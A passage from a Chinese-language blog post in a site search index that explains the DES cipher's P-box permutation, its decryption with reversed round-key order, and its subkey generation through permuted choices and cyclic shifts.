<h5 id="比特移位变换-P-盒"><a href="#比特移位变换-P-盒" class="headerlink" title="比特移位变换 P 盒"></a>比特移位变换 P 盒</h5><p>P 盒是对 S 盒变换后的 32 bit 数据进行比特移位。</p>
<p><img src="https://i.loli.net/2020/11/04/LB3S1Iik4peRfOd.png" style="zoom:80%;" /></p>
<p>也就是和初始置换一样的“对号入座”。</p>
<p>加密算法讲到这里为止，理解了这些，下面的脱密算法很快能熟悉掌握。</p>
<h2 id="脱密算法"><a href="#脱密算法" class="headerlink" title="脱密算法"></a>脱密算法</h2><p>DES 的脱密算法和加密运算用的是同一个算法，二者的唯一不同是圈（子）密钥的使用次序相反，如加密过程中第 1-16 轮子密钥的使用次序是 $k_1$，$k_2$，…，$k_{16}$ ，那么脱密就是 $k_{16}$，…，$k_2$，$k_1$ 。</p>
<p>其他都是相同。</p>
<h2 id="密钥生成算法"><a href="#密钥生成算法" class="headerlink" title="密钥生成算法"></a>密钥生成算法</h2><p>前面说过，DES 的输入密钥长度是 64 bit（有效密钥长度 56 bit），但我们进行迭代运算时用到的子密钥长度只有 48 bit ，这里就有关于密钥生成算法。</p>
<p><img src="https://i.loli.net/2020/11/04/zZJmKlIF9vcuwLG.png" style="zoom: 67%;" /></p>
<p>如上图，子密钥生成有关运算如下：</p>
<ul>
<li>置换选择 1</li>
<li>循环移位</li>
<li>置换选择 2</li>
</ul>
<h3 id="置换选择-1-（-64-bit-gt-56-bit）"><a href="#置换选择-1-（-64-bit-gt-56-bit）" class="headerlink" title="置换选择 1 （ 64 bit -&gt; 56 bit）"></a>置换选择 1 （ 64 bit -&gt; 56 bit）</h3><p>首先，每个字节的第八比特会被舍弃。</p>
<p><img src="https://i.loli.net/2020/11/04/TsgrL1kDhM5IKS7.png" style="zoom:80%;" /></p>
<p>然后再按照下表“对号入座”，得到的就是有效密钥。</p>
<p><img src="https://i.loli.net/2020/11/04/7D4wzfMvK5xY6Wy.png" style="zoom: 50%;" /></p>
<h3 id="循环移位"><a href="#循环移位" class="headerlink" title="循环移位"></a>循环移位</h3><p>然后将有效密钥 56 bit 分为左半部分 $C_0$ 和右半部分 $D_0$ 各 28 bit ，就如置换选择 1 的置换表划分的那样，上面就是 $C_0$ ，下面就是 $D_0$ 。</p>
<p>由 $C_0$ 和 $D_0$ 出发，$k_i$ 产生的具体过程如下：</p>
<ul>
<li><p>首先分别对 $C_{i-1}$ 和 $D_{i-1}$ 进行循环左移得到 $C_i$ 和 $D_i$ ，循环左移的位数与其所在的圈数 i 如下图所示：</p>
<p><img src="https://i.loli.net/2020/11/04/BMuzOgC28qXDSyf.png" style="zoom: 67%;" /></p>
</li>
<li><p>对 $C_i$ 和 $D_i$ 进行置换选择 2，仍是“对号入座”：</p>
<p><img src="https://i.loli.net/2020/11/04/yxUWLDaMzVjeEpS.png" style="zoom: 50%;" /></p>
</li>
</ul>
<p>由于 C 寄存器和 D 寄存器循环左移的位数都是 28 ，所以 $C_{16}=C_0$ ，$D_{16}=D_0$ ，在完成对一个明文分组加密后，就保证了 C 寄存器和 D 寄存器又回到了初始状态。</p>
<p>到这里，DES 的算法就介绍完毕了，希望对你有所帮助！</p>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>密码学</tag>
        <tag>DES</tag>
      </tags>
  </entry>
</search>
